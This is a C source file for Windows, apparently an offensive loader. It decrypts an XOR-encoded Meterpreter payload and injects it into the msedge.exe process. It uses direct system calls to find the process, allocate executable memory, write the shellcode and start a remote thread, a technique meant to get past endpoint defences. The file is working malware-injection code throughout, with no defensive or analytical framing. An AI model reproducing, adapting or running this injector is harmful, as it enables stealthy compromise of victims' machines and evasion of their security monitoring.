#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <memoryapi.h>
#include <tlhelp32.h>
#include "syscalls.h"
#include "buffer.h" // Buffer containing the XORed Meterpreter payload

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_INFO_LENGTH_MISMATCH
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#endif

// Define structure for system process information, used when querying system process information via native API functions
typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER SpareLi1;
	LARGE_INTEGER SpareLi2;
	LARGE_INTEGER SpareLi3;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	ULONG BasePriority;
	HANDLE UniqueProcessId;
	ULONG InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG PageDirectoryBase;
	SIZE_T PeakVirtualSize;
	SIZE_T VirtualSize;
	ULONG PageFaultCount;
	SIZE_T PeakWorkingSetSize;
	SIZE_T WorkingSetSize;
	SIZE_T QuotaPeakPagedPoolUsage;
	SIZE_T QuotaPagedPoolUsage;
	SIZE_T QuotaPeakNonPagedPoolUsage;
	SIZE_T QuotaNonPagedPoolUsage;
	SIZE_T PagefileUsage;
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION;

/* 
 * This function performs an XOR encryption/decryption on the input data.
 *
 * @param data: Pointer to the data to be encrypted/decrypted
 * @param data_len: Length of the data
 *
 * The function XORs each byte of the input data with a fixed key (0xAA).
 * This is a simple and symmetric encryption method, meaning the same 
 * function can be used for both encryption and decryption.
 */
void custom_xor(unsigned char* data, size_t data_len) {
	for (int i = 0; i < data_len; i++) {
		data[i] = data[i] ^ 0xAA;
	}
}

/*
 * This function finds the process ID (PID) of a target process by its name.
 *
 * @param target_process: Name of the target process (Unicode string)
 * 
 * @return process ID of the target process if found, otherwise 0.
 *
 * The function takes a snapshot of all processes in the system and then
 * iterates through them to find a process that matches the given name.
 * If a matching process is found, its process ID is returned.
 */
int FindTarget(const wchar_t* target_process) {
	PVOID buffer = NULL;
	ULONG buffer_size = 0x10000;
	ULONG needed_size = 0;

	buffer = malloc(buffer_size);
	NTSTATUS status;

	while ((status = Sw3NtQuerySystemInformation(SystemProcessInformation, buffer, buffer_size, &needed_size)) == STATUS_INFO_LENGTH_MISMATCH) {
		buffer_size = needed_size;
		buffer = realloc(buffer, buffer_size);
	}

	if (!NT_SUCCESS(status)) {
		printf("Failed to query process information.\n");
		free(buffer);
		return 0;
	}

	SYSTEM_PROCESS_INFORMATION* spi = (SYSTEM_PROCESS_INFORMATION*)buffer;
	int pid = 0;

	do {
		if (spi->ImageName.Buffer && wcscmp(spi->ImageName.Buffer, target_process) == 0) {
			pid = (int)spi->UniqueProcessId;
			break;
		}
		spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
	} while (spi->NextEntryOffset != 0);

	free(buffer);
	return pid;
}

/*
 * The entry point for the application. This function contains the main code for the shellcode injection.
 */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

	const wchar_t *target_process = L"msedge.exe";

	int pid = 0;

	HANDLE hThread, hProc;
	OBJECT_ATTRIBUTES object_attributes;
	CLIENT_ID clientId;

	LPVOID remote_process_buffer = NULL;
	LPVOID buf_pointer = &buf;
	SIZE_T buf_len = sizeof(buf);

	// find the process id
	pid = FindTarget(target_process);
	if (pid == 0) {
		wprintf(L"failed to find %s process\n", target_process);
		return 1;
	}

	// decrypt the buffer
	custom_xor(buf, sizeof(buf));

	clientId.UniqueProcess = (HANDLE)pid;
	clientId.UniqueThread = 0;

	InitializeObjectAttributes(&object_attributes, NULL, 0, NULL, NULL);

	Sw3NtOpenProcess(&hProc, PROCESS_ALL_ACCESS, &object_attributes, &clientId);

	// Injection
	Sw3NtAllocateVirtualMemory(hProc, &remote_process_buffer, 0, (PULONG)&buf_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Sw3NtWriteVirtualMemory(hProc, remote_process_buffer, buf_pointer, sizeof(buf), 0);

	Sw3NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, (LPTHREAD_START_ROUTINE)remote_process_buffer, NULL, FALSE, NULL, NULL, NULL, NULL);

	WaitForSingleObject(hProc, INFINITE);

	// Close handle of the opened process
	CloseHandle(hProc);

	return 0;
}
